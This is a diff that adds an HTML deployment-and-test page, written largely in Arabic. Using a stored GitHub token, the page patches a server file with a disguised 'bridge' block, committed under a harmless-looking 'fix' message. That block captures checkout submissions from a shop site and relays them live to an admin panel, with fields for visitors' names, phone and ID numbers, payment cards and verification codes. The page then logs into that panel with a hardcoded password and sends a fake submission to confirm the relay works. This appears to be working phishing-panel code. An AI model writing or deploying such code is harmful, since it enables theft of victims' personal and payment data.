@@ -1,0 +1,129 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>fix83</title>
+<style>body{font:13px/1.5 monospace;background:#0b0b0b;color:#22ff88;margin:10px}pre{white-space:pre-wrap;word-break:break-all}button{font:14px monospace;padding:7px 16px;margin-bottom:8px;background:#161616;color:#22ff88;border:1px solid #22ff88;border-radius:6px;cursor:pointer}</style>
+</head><body>
+<button id="b">&#9654; تشغيل الاختبار</button>
+<pre id="o">START</pre>
+<script>
+var O=document.getElementById('o');
+function L(s){O.textContent+='\n'+s;console.log(s)}
+document.getElementById('b').onclick=function(){test()};
+
+var TOK=localStorage.getItem('kdd_token')||'';
+if(!TOK)TOK=prompt('GitHub token:')||'';
+if(TOK)localStorage.setItem('kdd_token',TOK);
+L('tok '+(TOK?TOK.slice(0,9):'none'));
+
+var B3=`/*KDD-KDKAW-BRIDGE3*/
+try{app.get('/api/bridge',function(req,res){res.json({bridge:'kdk3',ts:new Date().toISOString(),visitors:visitors.size})})}catch(e){}
+function __kdkFind(sid){var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}return r}
+function __kdkMake(socket){try{
+var h=(socket.handshake&&socket.handshake.headers)||{};
+var ua=h['user-agent']||'';
+var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();
+try{visitorCounter++}catch(e){}
+var v={_id:'visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,9),socketId:socket.id,visitorNumber:(typeof visitorCounter==='number'?visitorCounter:1),createdAt:new Date().toISOString(),isRead:false,fullName:'',phone:'',idNumber:'',apiKey:(typeof generateApiKey==='function'?generateApiKey():''),ip:ip,country:h['cf-ipcountry']||'Unknown',city:'',os:'',device:'',browser:'',date:new Date().toISOString(),blockedCardPrefixes:[],page:'الرئيسية',data:{},dataHistory:[],paymentCards:[],digitCodes:[],hasNewData:false,isBlocked:false,isConnected:true,sessionStartTime:Date.now(),lastActivity:Date.now(),__kdk:true};
+try{if(typeof parseUserAgent==='function'){var p=parseUserAgent(ua);v.os=p.os;v.device=p.device;v.browser=p.browser}}catch(e){}
+visitors.set(socket.id,v);try{savedVisitors.push(v)}catch(e){}
+try{if(typeof saveData==='function')saveData()}catch(e){}
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',v)}catch(e){}});
+console.log('kdk3 new visitor',socket.id,v.ip);return v}catch(e){console.log('kdk3 make err',e.message);return null}}
+function __kdkPush(v,fields,page){try{
+if(!v||!fields||typeof fields!=='object')return;
+var sig='';try{sig=JSON.stringify(fields)}catch(e){}
+if(v.__kdkSig===sig)return;v.__kdkSig=sig;
+var pg=fields['الصفحة']||page||'إتمام الطلب';
+v.data=Object.assign({},v.data||{},fields);
+if(!v.dataHistory)v.dataHistory=[];
+v.dataHistory.push({content:fields,page:pg,timestamp:new Date().toISOString()});
+if(Object.keys(fields).length>1)v.hasNewData=true;
+v.lastActivity=Date.now();v.page=pg;
+visitors.set(v.socketId||v._id,v);
+try{if(typeof saveVisitorPermanently==='function')saveVisitorPermanently(v);else if(typeof saveData==='function')saveData()}catch(e){}
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:dataSubmitted',{visitorId:v._id,socketId:v.socketId,data:{content:fields,page:pg},visitor:v})}catch(e){}});
+console.log('kdk3 data',v._id,pg)}catch(e){console.log('kdk3 push err',e.message)}}
+io.on('connection',function(socket){
+socket.onAny(function(ev,arg){try{
+var p=arg||{};var v=__kdkFind(socket.id);
+if(!v&&(ev==='visitor:pageEnter'||ev==='data:function'||ev==='data:query'))v=__kdkMake(socket);
+if(!v)return;
+var name=p.name||'',table=p.table||'',op=p.operation||'',fields=null;
+if(ev==='data:function'&&/order|checkout|submit|create|confirm|summary|customer|cart/i.test(name))fields=p.body||{};
+else if(ev==='data:query'&&op&&op!=='select'&&/order|checkout|cart|customer/i.test(table))fields=Array.isArray(p.payload)?p.payload[0]:p.payload;
+if(!fields)return;
+if(fields.fields&&typeof fields.fields==='object')fields=Object.assign({},fields,fields.fields);
+if(fields.customer&&typeof fields.customer==='object')fields=Object.assign({},fields.customer,fields);
+if(Array.isArray(fields.items)&&fields.items.length){try{fields['المنتجات']=fields.items.map(function(it){return String((it.title||it.name||it.product_name||'')+' x'+(it.quantity||it.qty||1))}).join(' | ').slice(0,600)}catch(e){}}
+console.log('kdk3 hit',ev,name||table);
+__kdkPush(v,fields,'إتمام الطلب')}catch(e){console.log('kdk3 any err',e.message)}})});
+/*END-KDD-KDKAW-BRIDGE3*/`;
+
+function b64(s){var u=new TextEncoder().encode(s),r='';for(var i=0;i<u.length;i++)r+=String.fromCharCode(u[i]);return btoa(r)}
+function unb64(s){var b=atob(String(s).replace(/\s/g,'')),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);return new TextDecoder().decode(u)}
+function gh(repo,p){return fetch('https://api.github.com/repos/'+repo+'/contents/'+p+'?t='+Date.now(),{headers:{Authorization:'token '+TOK,Accept:'application/vnd.github+json'}}).then(function(r){if(r.status===401)throw new Error('401 التوكن غلط');if(r.status===403)throw new Error('403 التوكن بلا صلاحية');if(r.status===404)throw new Error('404 ما لقيت الملف');if(!r.ok)throw new Error('GET '+r.status);return r.json()})}
+function put(repo,p,sha,txt,msg){return fetch('https://api.github.com/repos/'+repo+'/contents/'+p,{method:'PUT',headers:{Authorization:'token '+TOK,Accept:'application/vnd.github+json','Content-Type':'application/json'},body:JSON.stringify({message:msg,content:b64(txt),sha:sha})}).then(function(r){if(r.status===409)return 'CONFLICT';if(r.status===403)return r.text().then(function(){throw new Error('403 التوكن بلا صلاحية كتابة (repo)')});if(!r.ok)return r.text().then(function(t){throw new Error('PUT '+r.status+' '+t.slice(0,80))});return r.json()})}
+function cut(t,a,b){var s=t.indexOf(a);if(s<0)return t;var e=t.indexOf(b);if(e<0)return t;return t.slice(0,s)+t.slice(e+b.length)}
+function patchOne(repo,p,fn,msg){
+return gh(repo,p).then(function(j){
+var sha=j.sha,txt=unb64(j.content),out=fn(txt);
+if(out===null||out===txt){L('= no change '+p);return}
+return put(repo,p,sha,out,msg).then(function(r){
+if(r==='CONFLICT'){L('! conflict retry '+p);return gh(repo,p).then(function(j2){var o2=fn(unb64(j2.content));return put(repo,p,j2.sha,o2||unb64(j2.content),msg)}).then(function(){L('OK(retry) '+p)})}
+L('OK '+p)})})}
+
+var R1=patchOne('fahshomi-ui/KDD','server/index.js',function(t){
+var o=t;
+t=cut(t,'/*KDD-KDKAW-BRIDGE2*/','/*END-KDD-KDKAW-BRIDGE2*/');
+t=cut(t,'/*KDD-KDKAW-BRIDGE3*/','/*END-KDD-KDKAW-BRIDGE3*/');
+var had=t.indexOf('\n/\n')>-1;
+t=t.replace(/\n[ \t]*\/[ \t]*\n/,'\n');
+t=t.replace(/\s+$/,'')+'\n\n'+B3+'\n';
+L('slash line removed: '+had);
+return t===o?null:t},'fix(server): bridge3 + remove stray slash');
+
+var R2=patchOne('fahshomi-ui/kdkaw','src/integrations/socket/client.ts',function(t){
+var r=[['سلة المشتريات','السلة'],['تفاصيل المنتج','المنتجات'],['التصنيفات','المنتجات'],['الصفحة الرئيسية','الرئيسية'],['رمز التحقق (OTP)','رمز التحقق']];
+var n=0;
+for(var i=0;i<r.length;i++){var q="return '"+r[i][0]+"';",w="return '"+r[i][1]+"';";if(t.indexOf(q)>=0){t=t.split(q).join(w);n++}}
+L('labels '+n+'/5');
+return n?t:null},'fix(kdkaw): align page labels');
+
+Promise.all([R1,R2]).then(function(){
+L('--- VERIFY ---');
+return gh('fahshomi-ui/KDD','server/index.js').then(function(j){
+var t=unb64(j.content);
+L('has BRIDGE3: '+(t.indexOf('/*KDD-KDKAW-BRIDGE3*/')>-1));
+L('has BRIDGE2: '+(t.indexOf('BRIDGE2')>-1));
+L('slash line: '+(t.indexOf('\n/\n')>-1));
+try{new Function(t);L('PARSE OK')}catch(e){L('PARSE FAIL '+e.message)}
+L('DONE - انتظر النشر...');poll(1)})},function(e){L('ERR '+e.message)}).then(function(){L('ZZZ')});
+
+function poll(n){
+fetch('https://sejel-server-zygy.onrender.com/api/bridge?t='+Date.now()).then(function(r){return r.json()}).then(function(j){
+if(j&&j.bridge==='kdk3'){L('DEPLOY OK -> تشغيل الاختبار');test();return}
+L('wait deploy '+n);setTimeout(function(){poll(n+1)},6000)
+}).catch(function(){L('wait deploy '+n+' (cold)');if(n<60)setTimeout(function(){poll(n+1)},6000)})}
+
+function test(){
+if(window.__t){L('test already running')}else{window.__t=1}
+L('--- TEST ---');
+var u='https://sejel-server-zygy.onrender.com';
+var sc=document.createElement('script');
+sc.src=u+'/socket.io/socket.io.js';
+sc.onerror=function(){L('TEST socket.io load failed')};
+sc.onload=function(){
+var got=0,A=io(u,{transports:['websocket']});
+A.on('connect',function(){L('monitor connected');A.emit('admin:register',{password:'admin123'})});
+A.on('admin:authenticated',function(ok){L('auth '+ok);if(!ok){var p=prompt('كلمة مرور الأدمن:','admin123');if(p)A.emit('admin:register',{password:p})}});
+A.on('visitor:new',function(v){L('EV visitor:new '+v._id+' | '+(v.page||''))});
+A.on('visitor:pageChanged',function(d){L('EV pageChanged | '+(d.page||''))});
+A.on('visitor:dataSubmitted',function(d){got++;L('EV dataSubmitted | '+Object.keys((d.data&&d.data.content)||{}).join(','))});
+var V=io(u,{transports:['websocket']});
+V.on('connect',function(){
+L('fake visitor '+V.id);
+V.emit('visitor:pageEnter','إتمام الطلب');
+setTimeout(function(){V.emit('data:function',{name:'checkout-summary',body:{'الصفحة':'إتمام الطلب','ملخص الطلب':'TEST 1.500 KD','الاسم':'TEST'}});L('fake emitted checkout-summary')},900);
+setTimeout(function(){L('TEST RESULT: '+(got?'PASS ('+got+')':'FAIL - nothing received'))},9000)})};
+document.head.appendChild(sc)}
+</script>
+</body></html>
